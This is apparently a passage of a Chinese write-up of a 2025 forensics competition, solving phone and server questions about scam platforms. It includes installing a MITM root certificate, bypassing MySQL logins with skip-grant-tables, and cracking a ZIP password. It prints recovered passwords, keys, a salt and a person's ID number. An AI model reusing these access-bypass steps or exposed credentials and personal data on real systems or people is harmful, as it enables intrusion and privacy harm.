选项（options）：\n勾选解密https通信、忽略证书服务器错误，再点击动作，把根证书导出到桌面：\n这时候电脑桌面就会生成一个证书安装器了，名称应该是FiddlerRoot.cer:\n双击打开，一路默认点击确定，直到安装成功：\n然后切换到连接（connections）选项卡，设置一个不冲突的端口，再选上允许远程计算机连接：\n点击确定，注意也要把之前https选项卡的选择保存，然后重启fiddler，保持不要关闭\n⚠️ Warning 你可能会发现现在本机访问网站会提示证书不信任/环境不安全，这是正常的，因为fiddler正在监视你\n把fiddler关掉，一切就会恢复正常，不用担心\n雷电模拟器代理设置 打开雷电模拟器，把网络桥接模式打开（会自动下载驱动），注意ip设置自动获取就好：\n开启root权限：\n重启模拟器让上面的设置生效\n不同版本的雷电模拟器编辑网络代理的方式不同，网上大部分教程是在模拟器内的系统设置里（不是雷电模拟器设置）对网络长按左键，就能进入“修改网络”进行代理设置\n不过我现在的版本不是这样，不同还是比较大：\n保存设置之后，下面来给模拟器安装证书\n雷电模拟器证书安装 打开共享文件夹，把之前导出的FiddlerRoot.cer放进去：\n接着进入设置 -\u0026gt; 安全性和位置信息 -\u0026gt; 加密与凭据 -\u0026gt; 从SD卡安装证书：\n切换到共享文件夹（可以在上面的工作文件打开安卓文件夹查看位置，默认是/mnt/shared/Pictures）：\n我已经放进去了，点击安装：\n💡 Tip 如果你放进去了却没有，重启一下，或者看看是不是有多开的雷电模拟器，被那个模拟器识别了\n名字随便取：\n设置一个绝对不会忘记的锁屏密码：\n提示已安装好之后，打开mt管理器（自己下载，这个文件管理器比自带的好用的多）\n把安装好的证书挪到系统目录中（/data/misc/user/0/cacerts-added/ -\u0026gt; /system/etc/security/cacerts/）：\n长按左侧下载的证书，点击移动到右侧：\n但你大概率会遇到以下问题：\n这是因为system分区没有解锁的原因，需要在设置里解锁：\n保存设置后重启，就能执行移动操作了：\n之后在用户凭据下就能看见我们安装好的证书：\n+++\n还有一种更加便捷的安装证书的办法\n打开模拟器内部浏览器，访问刚刚设置的ip+端口，会显示Fiddler的回显服务：\n💡 Tip 如果这一步出错，可以从以下几个方面排查问题：\n1.更换本机网络连接（换了之后ip会变，需要重新设置ip）\n2.检查Fiddler是否开启\n3.检查模拟器内的代理ip是否填写正确，端口号是否和Fiddler设置的一样\n我们点击下载证书：\n之后的过程和上面一样，只不过是省去了我们在共享文件导入证书的步骤\n不过我一点击下载证书就闪退，不知道为什么无法实现\n+++\n正式开始抓包 确保Fiddler是打开状态，模拟器里打开app进行访问，随便输入一个账号密码进行登录：\n之后搜索login，就能找到api地址：\nhttps://168js.bvocftd.com/ky188/member/memberManager/checkMobileLogin?v=0811739291780903 还有很多这样的url：\nhttps://168js.bvocftd.com/ky188/member/memberManager/appValidCodeEnable?v=042253679277362566 根据题目格式，这些并不是我们要的答案，看来得登陆成功：\n但是我并不能注册，也不知道为什么\n之前做题目的时候点击登录会弹出图形验证码，这次点击之后什么也没有发生\n总之就到这儿吧，正确答案如下，或许可以根据规律猜出来？\nhttps://168js.bvocftd.com/ky188/member/memberManager/login 17.请分析检材中澳门新葡京APK其中关于腾讯运营商的服务留存了QQ号是？[标准格式：123456790] 很巧，之前分析上一题的时候复制了一段代码给ai（具体是org.cocos2dx.javascript.AppActivity），就这么问出来了：\n1108221663 18.请分析Navicat中root用户的密码是什么？[标准格式：@123Aa] (=3]Zwjt#W 服务器 1.该集群主节点操作系统版本是？[标准格式：100.100.100] 第一件事就是把三台服务器全部仿真\n随便点开一个服务器查看网络配置信息：\n另外两台的配置也一样，这是使用了k8s\n💡 Tip K8s，也就是Kubernetes的缩写，是一个开源的容器编排平台，用来管理、部署和扩展容器化应用\n进入仿真机，能看见001是master主节点，另外两个都是node工作节点：\n所以应该是001的操作系统版本：\n7.9.2009 另外，我发现三台服务器都在192.168.2.0/24网段，查看后发现都是设置好的静态ip\n先改一下vmware的虚拟网络适配器，仅主机模式的设置关掉DHCP分配的功能，这样就能让他们保持原有的静态ip了：\n配置完后，它们服务应该就能正常使用了\n2.该集群创建时间是？[标准格式：0000-00-00T00:00:00Z] 从这题开始到第五题，由于k8s打不开（似乎是证书过期了），没办法做\n这部分应该就是些k8s的指令，后续学一下吧\n3.该集群共有多少个命名空间？[标准格式：100] 4.该集群所有命名空间内总共有多少个pod？[标准格式：100] 5.请给出该集群所使用的cni网络插件及其版本？[标准格式：abc-V1.1.1] 6.其中打金平台的后台登录地址跳转文件是？[标准格式：abc.php] 从现在开始重组服务器\n在火眼里面能看到工作节点1、2都安装了宝塔面板，由于不知道明文密码，我们分别登录两台服务器修改密码\n输入bt，唤起宝塔面板命令行控制程序：\n宝塔面板网页控制程序的url通过bt default查看：\n一定要使用https访问（尽管没有证书）\n进入之后，可以看见两台服务器都使用nginx各自托管了两个网站\n我们当然可以直接查看配置文件来判断网站是什么，不过最好的办法还是亲自访问一下更快\n先把nginx打开：\nnginx会通过配置文件里的server块的server_name字段参数来判断我们访问的时候应该加载哪一个网页，所以我们需要给自己的电脑HOST文件加上对应解析，这样访问的时候host值才会是域名而不是ip，才能正确访问网站\n我这里使用utools插件加一下：\n但是很离奇的事情发生了，dns解析之后我无法访问这四个网站的任何一个\n报错是502，服务器的问题，尝试很多方法都无法解决，甚至连错误日志都没有记录我的访问，百思不得其解\n+++\n*这里是写题之后补充的解答\n⚠️ Warning 在询问前辈之后，给出了一个解决办法，但是为什么这样做可以、上面的方法不行，并不清楚，我查了很多资料也没有找到为什么\n如果你知道，请留言，please！\n在宝塔里面可以很方便给域名添加对应server块的listen端口（具体的ngixn配置原理：Nginx的server块 ）：\n点击想要配置的域名，进入域名管理，选择一个不会冲突的端口给他配置上：\n添加成功之后直接用ip+端口访问，不需要添加host了：\n另外，要注意是否开启了网站对应版本的php-fpm\n💡 Tip PHP-FPM全称PHP FastCGI Process Manager，它是PHP的一个运行模式，专门管理多个PHP进程，和Nginx配合处理PHP请求\n没有php-fpm，Nginx就没法执行.php文件，会直接报502\n使用ps查看现有的后台进程：\nps -ef | grep php-fpm 最好调用init脚本去管理，systemctl有些问题，会把stop的status也识别成active\n注意在php-fpm后面加上版本号，也就是php-fpm-xx，这是宝塔管理多版本共存的手段：\n/etc/init.d/php-fpm-74 start /etc/init.d/php-fpm-74 restart /etc/init.d/php-fpm-74 stop /etc/init.d/php-fpm-74 status +++\n换个办法，一个个查看底下的index文件\n使用宝塔部署的网站源码被放在了/www/wwwroot，而更糟糕的是（对于我来说）网站使用的是ThinkPHP框架，这意味着index文件不再被放在当前网站根目录下（事实上那里也只有一个宝塔面板生成网站成功的页面），而是被放在了application目录下，更加难找了\n好在四个网站的类型在后面的题目有提到：\n打金平台、金瑞币平台，盲盒平台、借贷平台\n我的办法是过滤index.html/.htm和default.html/.htm文件，因为可以在/www/server/panel/vhost/nginx/www.gsjksu2kig.com.conf路径下看到配置文件，里面有这样对root和index的定义：\n四个网站都是这样\n但是我找第一个的时候就没办法判断，因为根本找不到欢迎页面，也有可能找到了但是网站logo被存储在某张图片里面，还有可能名称就是错误的\n没办法，如果连图片一起看的话实在太多了，我试着翻了一下还找到一张没打码的身份证？？？所以还是看文字就好，相信index和default吧\n先四个都看一遍，找找线索，然后统一确定\n1.www.gSJKsu2kig.com：\n暂时不能分辨，但根据后面可以判断出来\n金瑞币平台\n2.www.mtbtsdafda.com\n前脚还在烦恼怎么和上一个区分呢，后面就来了答案\n打金平台\n3.www.jiaoyoumf0up.com\n这个网站很奇怪，除了宝塔默认的index之外再无别的了\n不过它的index,php里面写了这样的东西：\ninclude \u0026#39;view/index.php\u0026#39;; // 如果没有 $mod，就加载默认首页 顺利的在view下找到了证据：\n盲盒平台\n4.www.jiedai0rmr.com\n这个也和之前不同，使用的是老版本的ThinkPHP框架\n其实做到这里基本上也明了了，因为第一个网站根目录里找到的有挖矿和博彩的功能，怎么说也不可能在借贷平台里面加上挖矿的页面吧，而且网站名称就是借贷的拼音\n*而且24题搞什么，直接题目就给出来了啊\n不过还是找一下证据吧：\n嗯，其实感觉这个证据不太好，还不如前面的判断\n借贷平台\nok，现在全都知道了\nwww.gSJKsu2kig.com ：金瑞币平台\nwww.mtbtsdafda.com ：打金平台\nwww.jiaoyoumf0up.com ：盲盒平台\nwww.jiedai0rmr.com ：借贷平台\n回到题目，打金平台的后台登录地址跳转文件\n其实我没指望grep搜出什么东西，比较login字符串太常见了，结果就是那么巧，最后一行是答案：\n实地考察，果真如此，原来就在根目录：\nWIdbdgd1Us.php 7.其中打金平台密码加密算法是？[标准格式：abc] 由上题可知打金平台为www.mtbtsdafda.com\n在对应文件夹下找到三个可能和登录有关的东西：\n其中前两个是前台登录，里面有这样的代码：\n\u0026#39;password\u0026#39; =\u0026gt; I(\u0026#39;password\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;md5\u0026#39;) 后面一个是后台登录：\n\u0026#39;password\u0026#39; =\u0026gt; I(\u0026#39;password\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;sha1\u0026#39;) 不知道正确的是哪一个\n8.其中打金平台中\u0026quot;13067137585\u0026quot;用户的累计产量有多少？[标准格式：100.00] 这题肯定是要连接数据库才能做出来的题目了\n一个比较好的办法是本地使用navicat链接数据库，因为这个数据库只允许本地访问，直接连是连不上去的，必须要使用ssh隧道，这样才能假装是在本地访问的：\n可以选择使用宝塔找到的普通使用者的账户密码，也能选择使用root：\n不过root的密码不知道为什么总是登不进去，建议是重启数据库，加上\u0026ndash;skip-grant-tables选项\n另外，重启还能解决一个问题\n如果直接使用宝塔面板管理数据库的话，会提示：\n数据库服务器连接失败！\u0026lt;pre\u0026gt;Can\u0026#39;t connect to MySQL server on \u0026#39;localhost\u0026#39; ([Errno 2] No such file or directory)\u0026lt;/pre\u0026gt; 尝试在直接在这台服务器登录，也会报错\u0026quot;找不到/tmp/socket文件\u0026quot;，和上面其实是一个原因：\n这个服务器配置了默认使用unix socket作为连接方式，而套接字文件又被他搞不见了！\n在本机navicat使用ssh隧道可以正常登录，因为它没有使用socket文件，而是用TCP端口（大概是这个原因）\n解决办法之一是在连接的时候强制指定tcp：\nmysql -u 用户名 -p -h 127.0.0.1 -P 3306 还有一种办法就是重启了，重启能让mysqld再次生成socket文件，正常使用socket（前提是设置里写了，这台服务器是写了的）\n先停止mysql服务：\nsystemctl stop mysqld 不过我在做这一步的时候有问题，它不能完全清除后台的进程，所以要手动杀死进程\n确认mysql进程pid：\nps -ef | grep mysqld 强制杀掉进程：\nkill -9 [进程号] 到这里后重启，也不能使用mysqld直接启动，否则会报错：\n2025-09-11T15:02:42.423175Z 0 [ERROR] Fatal error: Please read \u0026#34;Security\u0026#34; section of the manual to find out how to run mysqld as root! 也就是说mysql不能直接以root用户启动，这是linux的安全设计，windows是没有的\n正确启动方式是使用mysql_safe，这是linux里mysql自带的安全脚本，会调用mysqld并增加一些安全功能\n上文提到root密码不能登录，所以加上\u0026ndash;skip-grant-tables选项\n此外，mysqld_safe本身是一个shell脚本，默认会在前台运行，把日志直接输出到终端从而会占用整个窗口，加上\u0026amp;后就不会了\n最终重启命令：\nmysqld_safe --skip-grant-tables \u0026amp; 重启后所有问题都消失了，/tmp/socket重现人间，使用mysql -u root无需密码就能登录root，宝塔的数据库管理面板也不报错，可以使用了\n查看集群服务器的二号工作节点，会发现他的数据库也是存在这台一号机里面的：\n所以root登录好处多多啊\n回到问题：打金平台中\u0026quot;13067137585\u0026quot;用户的累计产量有多少\n我觉得需要结合前端网站分析，直接找数据库还是太难了\n不过也有办法，就是找有哪个表里面同时包含用户id和累计产量，但表和字段毕竟不是中文，还是很哪找的\n我直接看wp了，就是ds_order表：\nsql查询：\nselect SUM(already_profit) from ds_order where user = 13067137585; 43853.21258852 9.其中打金平台会员组最高溢价比例是多少？[标准格式：10.00] 宝塔网页，文件 -\u0026gt; 文件内容搜索，搜索溢价比：\n发现存储在yjbl这个变量里面，继续搜索：\n也就是存储在数据库表member_group字段名yjbl，通过会员组的level来定位取值\n找到这个表： 1.70 10.其中打金平台会员推广人数最多的会员其姓名是？[标准格式：名字] 搜索推广，看到可疑的文件：\n打开找到人数处理的部分：\n推广人数存储在member表里，直推人数字段是ztnum，团队人数字段是tdnum\n还是找到这个表：\n李奕欣 11.其中打金平台最早一次备份数据库的时间（Asia/Shanghai）是？[标准格式：2024-01-01-01:01:01] 在对象页面能看到ds_log记录了系统操作日志：\n时间是用时间戳的形式存储的：\n看不懂？哎🤓👆，这时候就可以用到我的时间戳转换工具了：\n可以看到时间是增大的，而表第8行就是最早的备份时间：\n2019-05-06 22:27:57 12.其中金瑞币（JINRUI COIN）平台图片上传平台是哪种类型？[标准格式：腾讯云ABC] 一个个找不现实，使用宝塔的文件内容搜索，相信好的编程人员会留下充足的中文注释的：\n点击编辑，打开看看：\nOSS\\OssClient是阿里云对象存储OSS官方PHP SDK的命名空间\n阿里云OSS 其实这个代码也没有限制上传文件类型，只是引入了think\\Image\n13.其中金瑞币平台手机直充接口是什么？[标准格式：http://xxx.xxx.xxx/xxx] 打开就能看见：\nhttp://op.juhe.cn/ofpay/sinopec/onlineorder 14.其中金瑞币平台后台登录地址是？[标准格式：http://xxx/xxx/xxx.xxx] 找到表单提交对象url：\n那就应该是：\nhttp://www.gSJKsu2kig.com/admin/login/index 15.其中金瑞币平台中密码加密盐值是？[标准格式：AbC1d] 搜索中文盐搜不出来，搜到了好玩的东西：\n笑死了\n原来要搜英文的salt：\nGWwRbMOPJYZCvE5gembG 16.其中金瑞币平台中交易手续费是百分之多少？[标准格式：100] 搜索手续费，发现是由变量$base_config的trade_sxf键控制：\n这个变量没有定义在这个文件，全局搜索一下：\n发现这样一行：\n$base_config = Db::name(\u0026#39;system\u0026#39;)-\u0026gt;field(\u0026#39;value\u0026#39;)-\u0026gt;where(\u0026#39;name\u0026#39;, \u0026#39;base_config\u0026#39;)-\u0026gt;find(); 这段代码用的应该是ThinkPHP框架的数据库操作类\nname()：指定要操作的数据表，表名是system\nfield()：只取出指定的这一列\nwhere()：加条件\nfind()：只取一条记录（返回数组/对象）\n也就是说这行代码等价于：\nselect value from system where name = \u0026#39;base_config\u0026#39; limit 1; 那么现在只要找出哪个数据库里面有system表就行了，对mysql的information_schema表查询：\nselect table_schema,table_name from information_schema.tables where table_name = \u0026#39;system\u0026#39;; 额，返回结果却是空？那搜索列名：\nselect table_schema,table_name,column_name from information_schema.columns where column_name = \u0026#39;value\u0026#39;; 虽然没有搜索到system表，但有一个wym_system表，事实上也的确就是这个表\n这里涉及一个点：在ThinkPHP里，Db::name()并不是直接拿表名，而是会根据配置里的表前缀prefix拼接出来\n我们搜索prefix可以看到：\n这里也就说明了表的前缀是由prefix指定的\n搜索prefix，可以在database.php文件里面看见定义的前缀，正是wym_：\n回到找到的wym_system，的确是有name为base_config的行：\n这里value存储的是一段PHP序列化的数据：\na:40:{s:6:\u0026#34;reg_zs\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:8:\u0026#34;reg_zskj\u0026#34;;s:12:\u0026#34;体验矿机\u0026#34;;s:9:\u0026#34;reg_pzskj\u0026#34;;s:0:\u0026#34;\u0026#34;;s:4:\u0026#34;sign\u0026#34;;s:4:\u0026#34;0.01\u0026#34;;s:4:\u0026#34;zjcj\u0026#34;;s:1:\u0026#34;0\u0026#34;;s:9:\u0026#34;trade_sxf\u0026#34;;s:2:\u0026#34;36\u0026#34;;s:6:\u0026#34;kj_sxf\u0026#34;;s:1:\u0026#34;5\u0026#34;;s:8:\u0026#34;cn_money\u0026#34;;s:4:\u0026#34;0.16\u0026#34;;s:11:\u0026#34;trade_price\u0026#34;;s:4:\u0026#34;0.83\u0026#34;;s:9:\u0026#34;add_price\u0026#34;;s:4:\u0026#34;0.04\u0026#34;;s:9:\u0026#34;buy_count\u0026#34;;s:1:\u0026#34;2\u0026#34;;s:8:\u0026#34;ykcz_sxf\u0026#34;;s:2:\u0026#34;30\u0026#34;;s:8:\u0026#34;hfcz_sxf\u0026#34;;s:2:\u0026#34;30\u0026#34;;s:7:\u0026#34;btc_sxf\u0026#34;;s:2:\u0026#34;30\u0026#34;;s:10:\u0026#34;sell_count\u0026#34;;s:6:\u0026#34;999999\u0026#34;;s:11:\u0026#34;gsell_count\u0026#34;;s:6:\u0026#34;999999\u0026#34;;s:12:\u0026#34;gsell2_count\u0026#34;;s:6:\u0026#34;999999\u0026#34;;s:11:\u0026#34;trade_start\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;trade_end\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:12:\u0026#34;trade_start1\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:10:\u0026#34;trade_end1\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:10:\u0026#34;sell_start\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:8:\u0026#34;sell_end\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:11:\u0026#34;sell_start1\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;sell_end1\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:11:\u0026#34;sell_start2\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;sell_end2\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:11:\u0026#34;sell_start3\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;sell_end3\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:11:\u0026#34;sell_start4\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;sell_end4\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:11:\u0026#34;sell_start5\u0026#34;;s:5:\u0026#34;09:00\u0026#34;;s:9:\u0026#34;sell_end5\u0026#34;;s:5:\u0026#34;23:00\u0026#34;;s:2:\u0026#34;zt\u0026#34;;a:4:{i:2;s:7:\u0026#34;9999999\u0026#34;;i:3;s:7:\u0026#34;9999999\u0026#34;;i:4;s:7:\u0026#34;9999999\u0026#34;;i:5;s:7:\u0026#34;9999999\u0026#34;;}s:4:\u0026#34;team\u0026#34;;a:4:{i:2;s:7:\u0026#34;9999999\u0026#34;;i:3;s:7:\u0026#34;9999999\u0026#34;;i:4;s:7:\u0026#34;9999999\u0026#34;;i:5;s:7:\u0026#34;9999999\u0026#34;;}s:4:\u0026#34;zcjl\u0026#34;;a:4:{i:2;s:0:\u0026#34;\u0026#34;;i:3;s:0:\u0026#34;\u0026#34;;i:4;s:0:\u0026#34;\u0026#34;;i:5;s:0:\u0026#34;\u0026#34;;}s:4:\u0026#34;kjjl\u0026#34;;a:4:{i:2;s:0:\u0026#34;\u0026#34;;i:3;s:0:\u0026#34;\u0026#34;;i:4;s:0:\u0026#34;\u0026#34;;i:5;s:0:\u0026#34;\u0026#34;;}s:3:\u0026#34;mzt\u0026#34;;a:4:{i:2;s:7:\u0026#34;9999999\u0026#34;;i:3;s:7:\u0026#34;9999999\u0026#34;;i:4;s:7:\u0026#34;9999999\u0026#34;;i:5;s:7:\u0026#34;9999999\u0026#34;;}s:5:\u0026#34;mzcjl\u0026#34;;a:4:{i:2;s:0:\u0026#34;\u0026#34;;i:3;s:0:\u0026#34;\u0026#34;;i:4;s:0:\u0026#34;\u0026#34;;i:5;s:0:\u0026#34;\u0026#34;;}s:5:\u0026#34;mkjjl\u0026#34;;a:4:{i:2;s:0:\u0026#34;\u0026#34;;i:3;s:0:\u0026#34;\u0026#34;;i:4;s:0:\u0026#34;\u0026#34;;i:5;s:0:\u0026#34;\u0026#34;;}} 所谓php序列化，就是把php的变量转换成字符串，方便存数据库、文件、网络传输\n可以直接使用php的反序列化函数unserialize()解码（序列化是serialize()），大概就是下面这样：\narray( \u0026#34;reg_zs\u0026#34; =\u0026gt; \u0026#34;0\u0026#34;, \u0026#34;reg_zskj\u0026#34; =\u0026gt; \u0026#34;体验矿机\u0026#34;, \u0026#34;reg_pzskj\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;sign\u0026#34; =\u0026gt; \u0026#34;0.01\u0026#34;, \u0026#34;zjcj\u0026#34; =\u0026gt; \u0026#34;0\u0026#34;, \u0026#34;trade_sxf\u0026#34; =\u0026gt; \u0026#34;36\u0026#34;, // ← 交易手续费 \u0026#34;kj_sxf\u0026#34; =\u0026gt; \u0026#34;5\u0026#34;, \u0026#34;cn_money\u0026#34; =\u0026gt; \u0026#34;0.16\u0026#34;, \u0026#34;trade_price\u0026#34; =\u0026gt; \u0026#34;0.83\u0026#34;, \u0026#34;add_price\u0026#34; =\u0026gt; \u0026#34;0.04\u0026#34;, \u0026#34;buy_count\u0026#34; =\u0026gt; \u0026#34;2\u0026#34;, \u0026#34;ykcz_sxf\u0026#34; =\u0026gt; \u0026#34;30\u0026#34;, \u0026#34;hfcz_sxf\u0026#34; =\u0026gt; \u0026#34;30\u0026#34;, \u0026#34;btc_sxf\u0026#34; =\u0026gt; \u0026#34;30\u0026#34;, \u0026#34;sell_count\u0026#34; =\u0026gt; \u0026#34;999999\u0026#34;, ... ) 终于找到手续费trade_sxf的值了\n36 17.其中金瑞币平台中目前有几种充值方式？[标准格式：100] 2 18.二号集群节点有源代码的网站目录有几个？（正在运行的除外）[标准格式：1] 只在二号工作节点看到一个未被使用的网站：\n不过这里面只有一个ini文件，不知道算不算，如果不算似乎一个也没有了\n1 19.二号集群节点memcached端口是？[标准格式：100] 11211 20.盲盒平台中余额最多的用户是？[标准格式：AbC1d] 依旧文件搜索：\n余额是通过$userInfo[\u0026lsquo;rmb\u0026rsquo;]变量存储的，搜索$userInfo：\n也就是说到$userInfo是pre_user数据库的一行信息，通过user定位\n再结合之前的$userInfo[\u0026lsquo;rmb\u0026rsquo;]，得到这个表有rmb和user两个字段，依据这个查询（有上题经验，不搜表名）：\nselect table_schema,table_name from information_schema.columns where column_name in (\u0026#39;user\u0026#39;,\u0026#39;rmb\u0026#39;) group by table_schema,table_name having count(distinct column_name) = 2; 果然根本不叫pre_user，点开就能找到rmb最多的人：\nZrAuyMT1tyo 21.盲盒平台可选二级域名有多少个？[标准格式：100] 搜索域名，查看相关文件，可以放在它的值来源于config('user_url')：\n继续搜索config，发现一个pre_config表：\n它存在与盲盒数据库里面，恰好有user_url，应该就是目标表：\n9yx.xyz,3rd.xyz,g3h.xyz,524f.fit,ze3g.fit,xa43.fit,scv4g.xyz,cxse.xyz,ddv.xyz,awev.xyz,eafv.fit,zxee3g.fit,zsefg.fit 数一下就行\n13 22.盲盒平台的支付密钥是？[标准格式：AbC1d] 搜索密钥可以看见支付密钥还是来源于config，也就是上一题的表：\nLDAWIucAQQGQp7rEE4nSlvzQMKZxTxopqNSwjL8PcAIBbVLJkh 23.盲盒平台中拥有分站的用户名是？[标准格式：123abc] 之前找可选域名的时候就找到了:\n$res = $DB-\u0026gt;query(\u0026#34;UPDATE `pre_site` SET `url`=\u0026#39;{$user_url}\u0026#39; WHERE `user`=\u0026#39;{$userName}\u0026#39;\u0026#34;); 找到这个pre_site，根据之前的经验很快就找到了真实表名mh_site：\n只有一条记录\n5432ef 24.借贷平台（www.jiedai0rmr.com ）中验证码发送接口域名是？[标准格式：http://xxx.xxx.xxx/] 从这题开始不知道宝塔犯什么病，一点编辑就卡死（可能是文件太多了或者别的什么），所以就用火眼了，实在麻烦，说一下大概思路\n搜索验证码：\n这个文件里面可以看见是由sendSSms函数进行验证码服务：\n搜素sendSSms，可以看到下面的代码：\n$Smsapi = new Smsapi($apiKey, $apiSecret); 也就是说真正发短信的逻辑在Smsapi这个类里，找到它看内容就行：\nclass Smsapi { protected $sendurl = \u0026#34;http://api.smsbao.com/\u0026#34;; public function send($number,$cont){ $user = \u0026#34;yunbeiw\u0026#34;; //短信平台帐号 $pass = md5(\u0026#34;yunbeiw\u0026#34;); //短信平台密码 $sendurl = $this-\u0026gt;sendurl.\u0026#34;sms?u=\u0026#34;.$user.\u0026#34;\u0026amp;p=\u0026#34;.$pass.\u0026#34;\u0026amp;m=\u0026#34;.$number.\u0026#34;\u0026amp;c=\u0026#34;.urlencode($cont); $result = file_get_contents($sendurl); return $result; } } http://api.smsbao.com/ 25.借贷平台后台登录密码的加密算法中共使用了多少次hash函数加密？[标准格式：10] 在上一题的CommonAction文件里面有：\nprotected function getpass($pass){ return sha1(md5(md5(C(\u0026#39;cfg_adminkey\u0026#39;)).md5($pass))); } 3次MD5+1次SHA1\n4 26.接上题，借贷平台中后台登录的密码额外加密字符串？[标准格式：123ABc+] 上题能知道是cfg_adminkey变量，搜索：\n26XBAmVMs+n_ 27.借贷平台中一共有多少借款订单？[标准格式：100] 依旧搜索：\n代码中checkorder()函数检查当前用户是否已经有借款订单，其中有这样的几行：\n$Order = D(\u0026#34;order\u0026#34;); $arr = array( \u0026#39;user\u0026#39; =\u0026gt; $this-\u0026gt;getLoginUser(), \u0026#39;money\u0026#39; =\u0026gt; $money, \u0026#39;months\u0026#39; =\u0026gt; $month, \u0026#39;monthmoney\u0026#39; =\u0026gt; ceil($order[\u0026#39;huankuan\u0026#39;] + $order[\u0026#39;fuwufei\u0026#39;]), \u0026#39;donemonth\u0026#39; =\u0026gt; 0, \u0026#39;addtime\u0026#39; =\u0026gt; time(), \u0026#39;status\u0026#39; =\u0026gt; 9, \u0026#39;pid\u0026#39; =\u0026gt; $status, \u0026#39;bank\u0026#39; =\u0026gt; $info[\u0026#39;bankname\u0026#39;], \u0026#39;banknum\u0026#39; =\u0026gt; $info[\u0026#39;bankcard\u0026#39;], \u0026#39;ordernum\u0026#39; =\u0026gt; $ordernum, \u0026#39;discode\u0026#39;=\u0026gt;$co[\u0026#34;discode\u0026#34;] ); $status = $Order-\u0026gt;add($arr); ThinkPHP中D(\u0026ldquo;order\u0026rdquo;)会返回对应的模型对象，操作的就是数据库表order，而下面的$arr内容则是order表的各个字段名称\n在二号工作节点，一共是三个数据库，前面用过两个，剩下的motx5dw就是借贷平台的了\n很快就能找打order表，并且字段名也对得上：\n43 28.借贷平台中\u0026quot;包玉莲\u0026quot;的收款卡号是？[标准格式：1000] 查看文件，里面提到修改卡号的逻辑：\n$Order = D(\u0026#34;userinfo\u0026#34;); $status = $Order-\u0026gt;where(array(\u0026#39;user\u0026#39; =\u0026gt; $user))-\u0026gt;save(array( \u0026#39;bankname\u0026#39; =\u0026gt; $bank, \u0026#39;bankcard\u0026#39; =\u0026gt; $banknum )); 找到userinfo表：\n342622197303241606 29.借贷平台中贷款最大限额是多少？[标准格式：100] 依旧公式：\n350000 30.请综合该集群一共有多少个网站数据库？[标准格式：100] 一共11个，其中information_schema、msyql、performance_schema、sys这四个是系统自带\n7 ","date":"2025-09-13T01:35:34+08:00","image":"http://picture.928330.xyz/typora/06846724f28c56ddac00bf19256bf4b0.jpg","permalink":"https://blog.928330.xyz/p/%E7%8D%AC%E8%B1%B8%E6%9D%AF2025%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"獬豸杯2025取证总结"},{"content":"獬（xie）豸（zhi）杯，据说獬豸是古代法律与司法的象征\n题目不算多，但是很多题目太过跳跃，思路容易断裂，没有之前的循序渐进的感觉（或许这样更符合现实？\n最大的收获应该就是熟悉了apk的逆向操作吧，还是有值得一做的地方的\n计算机部分 1.计算机系统的安装日期是什么时候（标准格式：20240120） 导入火眼分析的时候发现分区7被加密了，先不管它，看看系统信息：\n20240112 2.请问机主最近一次访问压缩包文件得到文件名称是什么（标准格式：1.zip） 在windows里显示后缀名和访问时间，筛选zip，注意下结尾是.zip1的文件即可：\ndata.zip 3.还原数据库，请分析root用户最后一次更改密码的时间是什么时候（标准格式：2024-01-20.12:12:12) 首先题目要求我们还原数据库，那么数据库在哪里？\n我们随便用压缩软件预览一下上一题找到的压缩包data.zip，就可以发现原来这是一个打包的mysql数据库：\n一解压，发现要密码？\n嗯，到这里就开始有点奇幻了\n总览一下给出的windows和ios镜像，可以发现什么软件也没安装，而手机是没有加密的，那么可能我们要找的线索就在之前加密的分区7里面\n但是这也要密码，只能再四处找一下了，最终在ios的备忘录里面找到了一点奇怪的东西：\n里面一共就两个内容：\nLongxin@123 700110 全部尝试一遍，发现都不能解压data.zip文件\n再试一遍能不能解密分区7，哇，发现第一个（Longxin@123）就能解密哎\n解密之后需要重新分析：\n重新分析后果然多了一些东西，其中最为重要的是两个邮件项：Foxmail和Eml邮件\n其中的内容有些重叠（或者说就是一样的），不过都能找到一些东西：\n两人互相发过一个加密文件，刚好之前的data.zip的md5值就跟他说的一样，这扯不扯：\n使用ARCPHR掩码爆破一下，还是挺快的： 15566666555 解压data.zip后就可以在本机启动myql服务了，这里我选择就在windows上面启动\nzip文件里面的mysql是典型的5.7版本构造，下载对应版本的mysql之后，写入如下my.ini配置文件：\n[client] # 指定默认链接端口号 port=4141 default-character-set=utf8 [mysqld] # 跳过密码验证 skip-grant-tables # 指定链接端口号 port=4141 # MySQL安装目录 basedir=D:\\mysql\\mysql_install # MySQL数据目录，也就是data.zip解压后的目录，下一级就是各种mysql文件 datadir=D:\\mysql\\data\\data # 允许远程连接 bind-address=0.0.0.0 skip-networking=0 # 其他常用配置 max_connections=200 character-set-server=utf8 default-storage-engine=INNODB sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES mysql默认端口是3306，我因为一些冲突原因改成了4141\nskip-grant-tables很重要，我们目的是找最后一次修改密码的时间，而我们本身不知道密码，跳过是最好的选择\n下面远程连接常用配置是ai写的，这些都不重要，写好保存，记下这个配置文件的路径，就可以启动服务了：\nstart /b mysqld --defaults-file=\u0026#34;D:\\mysql\\mysql_data\\my.ini\u0026#34; 这是临时指定配置文件启动mysql服务的命令\n💡 Tip start 